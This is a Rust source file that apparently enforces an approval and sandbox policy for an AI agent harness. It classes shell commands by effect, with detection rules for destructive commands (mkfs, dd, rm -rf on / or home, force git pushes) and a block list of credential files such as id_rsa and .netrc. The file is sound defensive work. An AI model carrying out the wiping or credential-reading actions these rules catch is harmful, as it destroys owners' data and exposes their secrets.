//! Capability policy for model-reachable effects. File tools check canonical paths, protect harness configuration, and
//! reject credential files. Shell commands keep approval checks, a scrubbed environment and process cleanup, and on
//! Linux the same file roots through Landlock (`confinement`, `crate::confine`). Network isolation is external. hx's
//! own configuration and state (`crate::dirs`) lie outside every root, so neither can reach them.
use crate::dirs::Dirs;
use crate::eventlog::EventLog;
use anyhow::{Context, Result, bail};
use serde::Deserialize;
use serde_json::json;
use std::path::{Component, Path, PathBuf};
use std::sync::Arc;

#[derive(Deserialize, Default)]
#[serde(deny_unknown_fields)]
struct PolicyFile {
    #[serde(default)]
    fs: FsSection,
    #[serde(default)]
    approval: ApprovalSection,
    #[serde(default)]
    budget: BudgetSection,
    #[serde(default)]
    packs: PacksSection,
}
#[derive(Deserialize, Default)]
#[serde(deny_unknown_fields)]
struct PacksSection {
    #[serde(default)]
    enable: Vec<String>,
}

/// `[budget]`: unknown keys are an error, so a removed or misspelled limit cannot silently run unlimited. Every other
/// section (and the file's top level) refuses unknown keys too.
#[derive(Deserialize, Default)]
#[serde(deny_unknown_fields)]
struct BudgetSection {
    max_tokens: Option<u64>,
    max_wall_secs: Option<f64>,
}

/// Limits for one run, shared with every subagent. None = unlimited. Tokens are input + cache reads + cache writes + output.
#[derive(Deserialize, serde::Serialize, Default, Clone, Debug, PartialEq)]
pub struct Budget {
    pub max_tokens: Option<u64>,
    pub max_wall_secs: Option<f64>,
}

/// A run budget is spent: nothing more is admitted. Displays as `budget_exceeded: REASON`, the prefix the Luau loop
/// reads; Rust code tells it apart by type (`anyhow::Error::is::<BudgetExceeded>`).
#[derive(Debug)]
pub struct BudgetExceeded(pub &'static str);

impl std::fmt::Display for BudgetExceeded {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "budget_exceeded: {}", self.0)
    }
}

impl std::error::Error for BudgetExceeded {}
#[derive(Deserialize, Default)]
#[serde(deny_unknown_fields)]
struct ApprovalSection {
    /// extra command substrings that count as external effects (need approval)
    #[serde(default)]
    ask: Vec<String>,
    /// commands and calls the USER pre-approves: a shell entry covers commands that start with its words (an irreversible
    /// command needs an exact full-command match); `mcp SERVER.TOOL` / `http NAMESPACE.ENDPOINT` name one call exactly
    #[serde(default)]
    allow: Vec<String>,
    mode: Option<ApprovalMode>,
}
#[derive(Deserialize, Default)]
#[serde(deny_unknown_fields)]
struct FsSection {
    #[serde(default)]
    read: Vec<String>,
    #[serde(default)]
    write: Vec<String>,
}
/// What happens to a command that needs approval and is not pre-approved in `policy.toml`.
#[derive(Clone, Copy, Debug, PartialEq, serde::Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum ApprovalMode {
    /// Refuse it without asking.
    Deny,
    /// Ask on the terminal.
    Prompt,
}

impl std::str::FromStr for ApprovalMode {
    type Err = anyhow::Error;
    fn from_str(s: &str) -> Result<Self> {
        match s {
            "deny" => Ok(Self::Deny),
            "prompt" => Ok(Self::Prompt),
            _ => anyhow::bail!("approval mode must be deny or prompt (got {s:?})"),
        }
    }
}

/// The live policy: the frozen settings a run's manifest records, plus its journal.
pub struct Policy {
    cfg: Snapshot,
    pub log: Arc<EventLog>,
    grants: std::sync::Mutex<Vec<PathGrant>>,
    /// hx's own directories: never inside a root, refused to file tools.
    pub dirs: Dirs,
    prompt: tokio::sync::Mutex<()>,
    /// An autoresearch worker's claim and best score, when `episode` is set.
    pub ar_progress: std::sync::Mutex<crate::ar::Progress>,
}

impl std::ops::Deref for Policy {
    type Target = Snapshot;
    fn deref(&self) -> &Snapshot {
        &self.cfg
    }
}

#[derive(Clone, Debug, serde::Serialize, Deserialize)]
pub struct Snapshot {
    #[serde(default)]
    pub autopilot: bool,
    pub workspace: PathBuf,
    pub tmp: PathBuf,
    pub read_roots: Vec<PathBuf>,
    pub write_roots: Vec<PathBuf>,
    pub protected: Vec<PathBuf>,
    /// Owner files under a read root that the model may neither read nor write in any mode: an autoresearch episode's
    /// grader and holdout roots.
    #[serde(default)]
    pub sealed: Vec<PathBuf>,
    /// The autoresearch episode this run serves (`ar.*`), recorded with the rest of the frozen policy.
    #[serde(default)]
    pub episode: Option<crate::ar::Episode>,
    pub ask: Vec<String>,
    pub allow: Vec<String>,
    pub mode: ApprovalMode,
    pub budget: Budget,
    pub packs: Vec<String>,
}

/// Who approved a request. Journaled by `name` with each shell command's outcome and each path grant; `hx log verify`
/// parses it back.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum ApprovalSource {
    /// A read or a local write: no approval needed.
    NotRequired,
    /// An `[approval] allow` entry in policy.toml.
    PolicyAllow,
    /// Autopilot (`--yes`).
    Auto,
    /// The owner, answering on the terminal.
    Prompt,
}

impl ApprovalSource {
    const ALL: [Self; 4] = [
        Self::NotRequired,
        Self::PolicyAllow,
        Self::Auto,
        Self::Prompt,
    ];

    /// The journaled form.
    pub fn name(self) -> &'static str {
        match self {
            Self::NotRequired => "not-required",
            Self::PolicyAllow => "policy-allow",
            Self::Auto => "auto",
            Self::Prompt => "prompt",
        }
    }

    /// The source a journaled name stands for, None for any other string.
    pub fn parse(name: &str) -> Option<Self> {
        Self::ALL.into_iter().find(|s| s.name() == name)
    }
}

/// A request was refused at the approval gate, or the owner could not be asked; it was not run. Displays as
/// `approval_required: WHY`, the prefix Luau code sees; Rust code tells it apart by type.
#[derive(Debug)]
pub struct ApprovalRequired(pub String);

impl std::fmt::Display for ApprovalRequired {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "approval_required: {}", self.0)
    }
}

impl std::error::Error for ApprovalRequired {}

#[derive(Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Debug)]
pub enum Class {
    Read,
    LocalWrite,
    External,
    Irreversible,
}

impl Class {
    pub fn name(self) -> &'static str {
        match self {
            Class::Read => "read",
            Class::LocalWrite => "local_write",
            Class::External => "external",
            Class::Irreversible => "irreversible",
        }
    }
}

/// Commands that reach outside the machine, as a program followed by subcommand words (in order, options between them
/// skipped). Matched on shell words, not substrings. This drives the approval prompt; it is not a guard: an arbitrary
/// shell command can reach the network without naming any of these.
const EXTERNAL: &[&[&str]] = &[
    &["git", "push"],
    &["npm", "publish"],
    &["cargo", "publish"],
    &["twine", "upload"],
    &["docker", "push"],
    &["ssh"],
    &["scp"],
    &["rsync"],
    &["kubectl", "apply"],
    &["kubectl", "delete"],
    &["terraform", "apply"],
    &["gh", "pr", "create"],
    &["gh", "release"],
    &["aws"],
    &["gcloud"],
    &["sendmail"],
];
/// `curl` methods that send data.
const CURL_WRITES: &[&str] = &["POST", "PUT", "PATCH", "DELETE"];
/// `git push` arguments that rewrite or delete remote history.
const PUSH_DESTRUCTIVE: &[&str] = &[
    "--force",
    "--force-with-lease",
    "--force-if-includes",
    "--delete",
    "--mirror",
    "--prune",
];
/// Programs that run the rest of their words as a command. Their own options decide which word that is
/// (`sudo -u root git`, `timeout -s KILL 5 git`), so the classifier takes the highest class any later word could give.
const WRAPPERS: &[&str] = &[
    "sudo", "doas", "env", "command", "builtin", "exec", "nohup", "time", "nice", "ionice", "chrt",
    "taskset", "timeout", "xargs", "parallel", "stdbuf", "setsid", "setpriv", "unshare", "nsenter",
    "chroot", "busybox", "flock", "strace", "ltrace",
];
/// How far after a wrapper its program may start. Every word up to the program is tried as the program, and each try
/// reads the rest of the command, so the bound keeps classification linear in the command's length. Real wrapper
/// options are short; a command whose program may start beyond the bound could hide anything, so it is classed
/// irreversible: autopilot never approves it.
const WRAPPED_OFFSETS: usize = 32;
/// Shell reserved words. At the start of a simple command they open or close a compound command and run nothing
/// themselves (`{ git push; }`, `then git push`, `do git push`), so they are skipped.
const RESERVED: &[&str] = &[
    "if", "then", "else", "elif", "fi", "do", "done", "while", "until", "for", "in", "case",
    "esac", "select", "function", "coproc", "{", "}", "!", "time",
];

/// System directories file tools and children may read. No `/dev`: a file tool reading `/dev/tty` would take the
/// owner's keystrokes, and `/dev/zero` never ends. Children get the harmless devices from `crate::confine`.
const SYSTEM_READ: &[&str] = &["/usr", "/bin", "/sbin", "/etc", "/opt"];
/// Credential files blocked by file tools, even inside an allowed read root.
const SECRET_FILES: &[&str] = &[
    "credentials",
    "credentials.toml",
    "secrets.toml",
    ".netrc",
    ".npmrc",
    ".pypirc",
    "id_rsa",
    "id_ed25519",
];

/// Is `path` (by file name) one of the credential files in SECRET_FILES?
pub fn is_secret(path: &Path) -> bool {
    path.file_name()
        .and_then(|n| n.to_str())
        .is_some_and(|n| SECRET_FILES.contains(&n))
}

const ENV_ALLOW: &[&str] = &[
    "PATH", "LANG", "LC_ALL", "LC_CTYPE", "TERM", "USER", "LOGNAME", "SHELL",
];
const TOOLS: &[&str] = &[
    "python3", "python", "pip3", "node", "npm", "npx", "git", "cargo", "rustc", "go", "uv", "ruby",
    "java", "make", "gcc", "clang", "deno", "bun",
];

/// Split a shell command line into its simple commands, each a list of words. POSIX-ish: single, double and `$'...'`
/// quotes, backslash escapes, comments, the operators `; & | ( )` and newlines between commands, and redirections. The
/// bodies of `$(...)` and backticks become commands of their own. It does not expand variables or aliases: a word keeps
/// a `$` wherever the shell would substitute text at run time (`$x`, `$'...'`, and a `$` in place of each command
/// substitution), so `is_literal` can tell the words whose text is known.
fn commands(line: &str) -> Vec<Vec<String>> {
    fn body(chars: &[char], mut i: usize, close: char) -> (String, usize) {
        // From just after `$(` or a backtick to its matching close; returns the body and the index after the close.
        let (mut depth, mut out) = (0usize, String::new());
        while i < chars.len() {
            let c = chars[i];
            if c == '\\' && i + 1 < chars.len() {
                out.push(c);
                out.push(chars[i + 1]);
                i += 2;
                continue;
            }
            if close == ')' && c == '(' {
                depth += 1;
            }
            if c == close {
                if depth == 0 {
                    return (out, i + 1);
                }
                depth -= 1;
            }
            out.push(c);
            i += 1;
        }
        (out, i)
    }
    let chars: Vec<char> = line.chars().collect();
    let (mut cmds, mut cur, mut word): (Vec<Vec<String>>, Vec<String>, Option<String>) =
        (vec![], vec![], None);
    let end_word = |cur: &mut Vec<String>, word: &mut Option<String>| {
        if let Some(w) = word.take() {
            cur.push(w);
        }
    };
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        match c {
            ' ' | '\t' => end_word(&mut cur, &mut word),
            ';' | '&' | '|' | '\n' | '(' | ')' => {
                end_word(&mut cur, &mut word);
                if !cur.is_empty() {
                    cmds.push(std::mem::take(&mut cur));
                }
            }
            '<' | '>' => {
                end_word(&mut cur, &mut word);
                if chars.get(i + 1) == Some(&'&') {
                    i += 1;
                } // `>&2` duplicates a descriptor; it ends no command
            }
            '#' if word.is_none() => {
                while i < chars.len() && chars[i] != '\n' {
                    i += 1;
                }
                continue;
            }
            '\'' => {
                let w = word.get_or_insert_with(String::new);
                i += 1;
                while i < chars.len() && chars[i] != '\'' {
                    w.push(chars[i]);
                    i += 1;
                }
            }
            '"' => {
                word.get_or_insert_with(String::new);
                i += 1;
                while i < chars.len() && chars[i] != '"' {
                    match chars[i] {
                        '\\' if i + 1 < chars.len()
                            && matches!(chars[i + 1], '"' | '\\' | '$' | '`') =>
                        {
                            word.as_mut().unwrap().push(chars[i + 1]);
                            i += 2;
                        }
                        '$' if chars.get(i + 1) == Some(&'(') => {
                            word.as_mut().unwrap().push('$');
                            let (b, next) = body(&chars, i + 2, ')');
                            cmds.extend(commands(&b));
                            i = next;
                        }
                        '`' => {
                            word.as_mut().unwrap().push('$');
                            let (b, next) = body(&chars, i + 1, '`');
                            cmds.extend(commands(&b));
                            i = next;
                        }
                        ch => {
                            word.as_mut().unwrap().push(ch);
                            i += 1;
                        }
                    }
                }
            }
            '\\' => {
                if let Some(&next) = chars.get(i + 1) {
                    if next != '\n' {
                        word.get_or_insert_with(String::new).push(next);
                    }
                    i += 1;
                }
            }
            '$' if chars.get(i + 1) == Some(&'(') => {
                word.get_or_insert_with(String::new).push('$');
                let (b, next) = body(&chars, i + 2, ')');
                cmds.extend(commands(&b));
                i = next;
                continue;
            }
            '`' => {
                word.get_or_insert_with(String::new).push('$');
                let (b, next) = body(&chars, i + 1, '`');
                cmds.extend(commands(&b));
                i = next;
                continue;
            }
            '$' if chars.get(i + 1) == Some(&'\'') => {
                // ANSI-C quoting: a backslash escapes the next character, `\'` included.
                let w = word.get_or_insert_with(String::new);
                w.push('$');
                i += 2;
                while i < chars.len() && chars[i] != '\'' {
                    if chars[i] == '\\' && i + 1 < chars.len() {
                        i += 1;
                    }
                    w.push(chars[i]);
                    i += 1;
                }
            }
            ch => word.get_or_insert_with(String::new).push(ch),
        }
        i += 1;
    }
    end_word(&mut cur, &mut word);
    if !cur.is_empty() {
        cmds.push(cur);
    }
    cmds
}

/// Is `word` a shell variable assignment (`NAME=value`)?
fn is_assignment(word: &str) -> bool {
    word.split_once('=').is_some_and(|(k, _)| {
        !k.is_empty() && k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
    })
}

/// How many leading words of a simple command are shell reserved words: they open or close a compound command and
/// run nothing themselves. `time` is one of them and takes `-p` and `--`.
fn reserved_len(words: &[String]) -> usize {
    let (mut n, mut after_time) = (0, false);
    while let Some(word) = words.get(n) {
        let word = word.as_str();
        if RESERVED.contains(&word) {
            after_time = word == "time";
        } else if !(after_time && matches!(word, "-p" | "--")) {
            break;
        }
        n += 1;
    }
    n
}

/// A simple command's words from its first program word on: leading reserved words and assignments skipped.
fn command_words(words: &[String]) -> &[String] {
    let words = command_words_after_reserved(words);
    let start = words
        .iter()
        .position(|w| !is_assignment(w))
        .unwrap_or(words.len());
    &words[start..]
}

/// A simple command's words with leading reserved words skipped (`{ git push; }` is `git push`). Assignments stay:
/// `GIT_SSH_COMMAND=x git push` is not the command an entry for `git push` approved.
fn command_words_after_reserved(words: &[String]) -> &[String] {
    &words[reserved_len(words)..]
}

/// The highest effect class among the simple commands of a script given as one string (`bash -c`, `eval`,
/// `env -S`).
fn script_class(script: &str) -> Class {
    commands(script)
        .iter()
        .map(|c| class_of(c))
        .max()
        .unwrap_or(Class::LocalWrite)
}

/// The scripts `env` is told to split into a command: the values of `-S` and `--split-string`, attached or not.
fn split_strings(words: &[String]) -> impl Iterator<Item = &str> {
    words.iter().enumerate().filter_map(|(k, word)| {
        let next = || words.get(k + 1).map(String::as_str);
        if let Some(value) = word.strip_prefix("--split-string") {
            return value
                .strip_prefix('=')
                .or_else(|| value.is_empty().then(next).flatten());
        }
        // A cluster of short options: `S` takes the rest of the word, or the next word.
        let cluster = word.strip_prefix('-').filter(|c| !c.starts_with('-'))?;
        let (_, value) = cluster.split_once('S')?;
        if value.is_empty() {
            next()
        } else {
            Some(value)
        }
    })
}

/// The effect class of one simple command (its words, as `commands` splits them).
fn class_of(words: &[String]) -> Class {
    let words = command_words(words);
    let Some(first) = words.first() else {
        return Class::LocalWrite;
    };
    if !WRAPPERS.contains(&program(first)) {
        return program_class(words);
    }
    // Which word a wrapper runs depends on its options (`sudo -u root git`), so every word up to the last one that can
    // be the program is tried as the program; that covers nested wrappers too. Past the bound nothing is known, and
    // what cannot be seen is assumed to be the worst.
    let (last, unknown) = match last_program_offset(words) {
        Some(last) => (last, Class::LocalWrite),
        None => (WRAPPED_OFFSETS, Class::Irreversible),
    };
    let split = if words.iter().any(|w| program(w) == "env") {
        split_strings(words)
            .map(script_class)
            .max()
            .unwrap_or(Class::LocalWrite)
    } else {
        Class::LocalWrite
    };
    (1..words.len().min(last + 1))
        .map(|k| program_class(command_words(&words[k..])))
        .fold(unknown.max(split), Class::max)
}

/// Can the shell run `word` as written? `commands` leaves a `$` wherever the shell substitutes text at run time, so a
/// word with one names a program (or subcommand) the classifier cannot know.
fn is_literal(word: &str) -> bool {
    !word.contains('$')
}

/// Operands a wrapper takes before the program it runs (`timeout 5 git`, `chroot /srv git`).
fn leading_operands(wrapper: &str) -> usize {
    match wrapper {
        "timeout" | "chroot" | "chrt" | "taskset" | "flock" => 1,
        _ => 0,
    }
}

/// The last offset in `words` (a simple command whose first word is a wrapper) at which the wrapped program can start,
/// following nested wrappers; None when that may lie beyond `WRAPPED_OFFSETS`. Options and their values come first,
/// so the first word that is neither an option, an assignment nor the value of an option is the wrapper's first
/// operand, and the program follows its leading operands. `command -v` and `command -V` run nothing.
fn last_program_offset(words: &[String]) -> Option<usize> {
    let (mut wrapper, mut furthest) = (0, 0);
    loop {
        let name = program(&words[wrapper]);
        // The words that can be this wrapper's program.
        let (from, last) = {
            let mut operand = None;
            for k in wrapper + 1..words.len() {
                if k > WRAPPED_OFFSETS {
                    return None;
                }
                let w = &words[k];
                if name == "command"
                    && w.starts_with('-')
                    && !w.starts_with("--")
                    && (w.contains('v') || w.contains('V'))
                {
                    return Some(furthest.max(k));
                }
                if !w.starts_with('-') && !is_assignment(w) && !words[k - 1].starts_with('-') {
                    operand = Some(k);
                    break;
                }
            }
            let Some(first) = operand else {
                return Some(words.len() - 1);
            };
            let last = first + leading_operands(name);
            if last >= words.len() {
                return Some(words.len() - 1);
            }
            if last > WRAPPED_OFFSETS {
                return None;
            }
            (first, last)
        };
        furthest = furthest.max(last);
        // A nested wrapper (`sudo nice -n 5 git`) has options of its own; its program comes later still.
        match (from..=last)
            .rev()
            .find(|&k| WRAPPERS.contains(&program(&words[k])))
        {
            Some(k) => wrapper = k,
            None => return Some(furthest),
        }
    }
}

/// Is an `rm` argument the whole filesystem or the home directory (`/`, `//`, `/.`, `~/`, `$HOME/.`, `/*`, ...)?
fn is_rm_root(arg: &str) -> bool {
    let mut t = arg;
    while let Some(shorter) = t.strip_suffix("/.").or_else(|| t.strip_suffix('/')) {
        t = shorter;
    }
    !arg.is_empty()
        && matches!(
            t,
            "" | "/*" | "~" | "~/*" | "$HOME" | "$HOME/*" | "${HOME}" | "${HOME}/*"
        )
}

/// The class of `git push ARGS`.
fn push_class(args: &[String]) -> Class {
    let destructive = args.iter().any(|a| {
        PUSH_DESTRUCTIVE
            .iter()
            .any(|d| a == d || a.starts_with(&format!("{d}=")))
            || (a.starts_with('-') && !a.starts_with("--") && (a.contains('f') || a.contains('d')))
            || ((a.starts_with('+') || a.starts_with(':')) && a.len() > 1)
    });
    if destructive {
        Class::Irreversible
    } else {
        Class::External
    }
}

/// The effect class of a simple command whose first word is the program.
fn program_class(words: &[String]) -> Class {
    let Some(first) = words.first() else {
        return Class::LocalWrite;
    };
    if !is_literal(first) {
        return Class::External;
    }
    let (prog, args) = (program(first), &words[1..]);
    match prog {
        "bash" | "sh" | "zsh" | "dash" | "ksh" => {
            // `bash -c 'script'` runs its script (`bash -lc`, `bash -c -- 'script'` too): the first operand after the flag.
            let script = args
                .iter()
                .position(|a| a.starts_with('-') && !a.starts_with("--") && a.contains('c'))
                .and_then(|p| args[p + 1..].iter().find(|a| !a.starts_with('-')));
            return script.map_or(Class::LocalWrite, |s| script_class(s));
        }
        "eval" => return script_class(&args.join(" ")),
        // `find` runs the command after each `-exec`, `-execdir`, `-ok` and `-okdir`, up to its `;` or `+`.
        "find" => {
            return args
                .iter()
                .enumerate()
                .filter(|(_, a)| matches!(a.as_str(), "-exec" | "-execdir" | "-ok" | "-okdir"))
                .map(|(k, _)| {
                    let command = &args[k + 1..];
                    let end = command
                        .iter()
                        .position(|a| matches!(a.as_str(), ";" | "+"))
                        .unwrap_or(command.len());
                    class_of(&command[..end])
                })
                .max()
                .unwrap_or(Class::LocalWrite);
        }
        "mkfs" => return Class::Irreversible,
        p if p.starts_with("mkfs.") => return Class::Irreversible,
        "dd" if args
            .iter()
            .any(|a| a.starts_with("if=") || a.starts_with("of=")) =>
        {
            return Class::Irreversible;
        }
        "rm" => {
            let recursive = args.iter().any(|a| {
                a == "--recursive"
                    || (a.starts_with('-')
                        && !a.starts_with("--")
                        && (a.contains('r') || a.contains('R')))
            });
            return if recursive && args.iter().any(|a| is_rm_root(a)) {
                Class::Irreversible
            } else {
                Class::LocalWrite
            };
        }
        "git" => {
            // Global options come before the subcommand and some take a value (`-C dir`, `--git-dir .git`). Which word
            // is the subcommand depends on which options take one, so each word that could be it counts.
            let mut class = Class::LocalWrite;
            for (j, a) in args.iter().enumerate() {
                if a.starts_with('-') {
                    continue;
                }
                if a == "push" {
                    class = class.max(push_class(&args[j + 1..]));
                }
                if j == 0 || !args[j - 1].starts_with('-') {
                    // Not an option's value, so the subcommand; one the shell substitutes could be `push`.
                    if !is_literal(a) {
                        class = class.max(Class::External);
                    }
                    break;
                }
            }
            return class;
        }
        "curl" => {
            let method = args.iter().enumerate().find_map(|(k, a)| {
                if a == "-X" || a == "--request" {
                    args.get(k + 1).cloned()
                } else {
                    a.strip_prefix("--request=")
                        .or_else(|| a.strip_prefix("-X"))
                        .filter(|m| !m.is_empty())
                        .map(String::from)
                }
            });
            let sends = args.iter().any(|a| {
                matches!(
                    a.as_str(),
                    "-d" | "--data"
                        | "--data-raw"
                        | "--data-binary"
                        | "--data-urlencode"
                        | "-F"
                        | "--form"
                        | "-T"
                        | "--upload-file"
                )
            });
            return if sends
                || method.is_some_and(|m| CURL_WRITES.contains(&m.to_ascii_uppercase().as_str()))
            {
                Class::External
            } else {
                Class::LocalWrite
            };
        }
        _ => {}
    }
    let external = EXTERNAL.iter().any(|pattern| {
        // The subcommand words appear in order among the arguments, options and their values in between.
        pattern[0] == prog && {
            let mut rest = args.iter();
            pattern[1..].iter().all(|want| rest.any(|a| a == want))
        }
    });
    if external {
        Class::External
    } else {
        Class::LocalWrite
    }
}

/// A command word's program name: `/usr/bin/git` is `git`.
fn program(word: &str) -> &str {
    word.rsplit('/').next().unwrap_or(word)
}

fn canon(p: impl AsRef<Path>) -> Option<PathBuf> {
    std::fs::canonicalize(p).ok()
}

/// Lexically normalize an absolute path (resolve `.` and `..` without touching the filesystem).
fn normalize(p: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for c in p.components() {
        match c {
            Component::ParentDir => {
                out.pop();
            }
            Component::CurDir => {}
            other => out.push(other.as_os_str()),
        }
    }
    out
}

#[derive(Clone, Debug, serde::Serialize, Deserialize)]
struct PathGrant {
    path: PathBuf,
    recursive: bool,
    write: bool,
}

#[derive(Debug)]
struct OutsideRoots {
    path: PathBuf,
    write: bool,
}
impl std::fmt::Display for OutsideRoots {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "policy: {} {} is outside the allowed roots",
            if self.write { "writing" } else { "reading" },
            self.path.display()
        )
    }
}
impl std::error::Error for OutsideRoots {}

/// Model-controlled text (a command, a path, call arguments) as it is shown to the owner: control characters (CR,
/// ESC, ...) and invisible or reordering characters appear as escapes, so the text cannot rewrite the prompt the owner
/// answers. Quotes stay as they are.
pub fn shown(text: &str) -> String {
    text.chars()
        .map(|c| {
            if matches!(c, '"' | '\'') {
                c.to_string()
            } else {
                c.escape_debug().to_string()
            }
        })
        .collect()
}

/// Read only the owner's controlling terminal. Nonblocking IO lets cancellation/deadlines close it immediately.
/// Input typed before the question appeared is discarded, so typeahead cannot answer it.
async fn ask(question: &str) -> Result<bool> {
    use std::io::{Read, Write};
    use std::os::fd::AsRawFd;
    use std::os::unix::fs::OpenOptionsExt;
    let tty = std::fs::OpenOptions::new()
        .read(true)
        .write(true)
        .custom_flags(libc::O_NONBLOCK)
        .open("/dev/tty")
        .map_err(|_| {
            anyhow::anyhow!("no controlling terminal; configure policy.toml or use --yes")
        })?;
    let mut tty = tty;
    // Discard what was typed before the question is shown; an answer typed after it appears counts.
    // SAFETY: tcflush takes an open descriptor (`tty` outlives the call) and a constant; it touches no memory.
    if unsafe { libc::tcflush(tty.as_raw_fd(), libc::TCIFLUSH) } != 0 {
        return Err(anyhow::Error::from(std::io::Error::last_os_error())
            .context("discarding pending terminal input"));
    }
    writeln!(tty, "\n[approval needed] {question}\napprove? [y/N] ")?;
    let mut answer = Vec::new();
    loop {
        let mut buf = [0; 256];
        match tty.read(&mut buf) {
            Ok(0) => return Ok(false),
            Ok(n) => {
                answer.extend_from_slice(&buf[..n]);
                if answer.contains(&b'\n') || answer.len() > 256 {
                    return Ok(matches!(
                        String::from_utf8_lossy(&answer).trim(),
                        "y" | "Y" | "yes"
                    ));
                }
            }
            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                tokio::time::sleep(std::time::Duration::from_millis(25)).await;
            }
            Err(e) if e.kind() == std::io::ErrorKind::Interrupted => {}
            Err(e) => return Err(e.into()),
        }
    }
}

/// A named external operation whose identity hx fixes before asking: an MCP server's tool or an HTTP tool's endpoint.
/// Approval is decided on this identity alone; the call's arguments are shown to the owner but never matched.
#[derive(Clone, Copy, Debug)]
pub enum Call<'a> {
    Mcp {
        server: &'a str,
        tool: &'a str,
    },
    Http {
        namespace: &'a str,
        endpoint: &'a str,
    },
}

impl Call<'_> {
    /// (kind, owner, operation): `("mcp", server, tool)` or `("http", namespace, endpoint)`.
    fn parts(&self) -> (&'static str, &str, &str) {
        match *self {
            Call::Mcp { server, tool } => ("mcp", server, tool),
            Call::Http {
                namespace,
                endpoint,
            } => ("http", namespace, endpoint),
        }
    }

    /// Does the `[approval] allow` entry name this call? `mcp SERVER.TOOL` (or `http NAMESPACE.ENDPOINT`) names one
    /// operation, `mcp SERVER.*` all of a server's. The entry splits at its first dot, so a server name that contains
    /// one can never be pre-approved.
    fn allowed_by(&self, entry: &str) -> bool {
        let (kind, owner, op) = self.parts();
        let Some(rest) = entry
            .trim()
            .strip_prefix(kind)
            .and_then(|r| r.strip_prefix(' '))
        else {
            return false;
        };
        rest.split_once('.')
            .is_some_and(|(o, name)| o == owner && (name == op || name == "*"))
    }
}

impl std::fmt::Display for Call<'_> {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let (kind, owner, op) = self.parts();
        write!(f, "{kind} {}.{}", shown(owner), shown(op))
    }
}

/// How many characters of a call's arguments the approval prompt shows.
const PROMPT_ARGS_CHARS: usize = 2000;

impl Policy {
    /// `autopilot` is the launching user's `--yes`: automatically approve ordinary requests.
    /// Canonical paths, credentials, sealed state, hx's own directories and protected configuration are checked in
    /// every mode. `resume` is the journal of the run to continue, which must be in this workspace's log directory.
    pub fn new(
        dirs: &Dirs,
        workspace: &Path,
        autopilot: bool,
        approval_mode: Option<ApprovalMode>,
        resume: Option<&Path>,
        episode: Option<crate::ar::Episode>,
    ) -> Result<Policy> {
        let workspace = std::fs::canonicalize(workspace)?;
        let own = dirs.workspace(&workspace);
        if let Some(path) = resume {
            let actual = std::fs::canonicalize(path)
                .with_context(|| format!("run log {}", path.display()))?;
            anyhow::ensure!(
                actual.parent() == Some(own.log.as_path()),
                "{} is not in this workspace's log directory {}; a run resumes only from there",
                path.display(),
                own.log.display()
            );
            // Lock before reading any recovery state or repairing the log. Mutable workspace configuration is never
            // consulted for a resumed run: the exact authority approved at launch is part of its manifest.
            let log = EventLog::reopen(&actual)?;
            let manifest = crate::supervisor::Manifest::load(&actual)?;
            anyhow::ensure!(
                manifest.policy.workspace == workspace,
                "resume workspace differs from the saved run"
            );
            let p = manifest.policy;
            validate_scratch(&p.tmp)?;
            std::fs::create_dir_all(&p.tmp)?;
            // The orchestrator retries an episode as a new child and never resumes one; a stale episode must not get `ar`.
            anyhow::ensure!(
                p.episode.is_none(),
                "this run was an autoresearch episode; continue the search with `hx run --ar --resume RUN`"
            );
            log.check()?;
            if crate::confine::status().is_err() {
                log.write(
                    "confinement",
                    json!({"confinement": crate::confine::describe()}),
                    true,
                )?;
            }
            let grants = crate::eventlog::load(&actual)?
                .iter()
                .filter(|r| r["kind"] == "path_grant")
                .map(|r| serde_json::from_value(r["grant"].clone()))
                .collect::<std::result::Result<Vec<PathGrant>, _>>()?;
            // hx's directories may have moved since launch (another XDG_STATE_HOME): the frozen roots must still miss them.
            check_roots(
                dirs,
                p.read_roots
                    .iter()
                    .chain(&p.write_roots)
                    .chain(grants.iter().map(|g| &g.path)),
            )?;
            return Ok(Policy {
                cfg: p,
                log,
                grants: grants.into(),
                dirs: dirs.clone(),
                prompt: Default::default(),
                ar_progress: Default::default(),
            }
            .live());
        }
        let modules_sha =
            crate::eventlog::sha_bytes(&serde_json::to_vec(crate::modules::EMBEDDED)?);
        let tmp = std::env::temp_dir().join(format!(
            "hx-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)?
                .subsec_nanos()
        ));
        std::fs::create_dir_all(&tmp)?;
        let tmp = std::fs::canonicalize(tmp)?;
        let mut p = Snapshot {
            autopilot,
            workspace: workspace.clone(),
            tmp: tmp.clone(),
            read_roots: vec![],
            write_roots: vec![],
            protected: vec![],
            sealed: vec![],
            episode: None,
            ask: vec![],
            allow: vec![],
            mode: ApprovalMode::Prompt,
            budget: Budget::default(),
            packs: vec![],
        };
        p.read_roots.extend([workspace.clone(), tmp.clone()]);
        p.write_roots.extend([workspace.clone(), tmp.clone()]);
        // Git runs hooks and configured commands unconfined on the owner's next `git` in this workspace.
        p.protected.extend([
            workspace.join(".harness"),
            workspace.join("hx.lock"),
            workspace.join(".git/config"),
            workspace.join(".git/hooks"),
        ]);
        if let Some(e) = &episode {
            p.sealed.extend(crate::ar::sealed(e));
        }
        p.episode = episode;
        for r in SYSTEM_READ {
            if let Some(c) = canon(r) {
                p.read_roots.push(c);
            }
        }
        p.read_roots.extend(toolchain_roots());
        // check_write resolves aliases before comparing. Protect the resolved configuration too, including an
        // untrusted workspace's symlinked .harness or hx.lock.
        let canonical_protected: Vec<_> = p.protected.iter().filter_map(canon).collect();
        p.protected.extend(canonical_protected);
        let canonical_sealed: Vec<_> = p.sealed.iter().filter_map(canon).collect();
        p.sealed.extend(canonical_sealed);
        // The policy is parsed from the bytes the trust decision covered, never from a second read of the file.
        let config = crate::trust::trusted(&workspace, dirs)?;
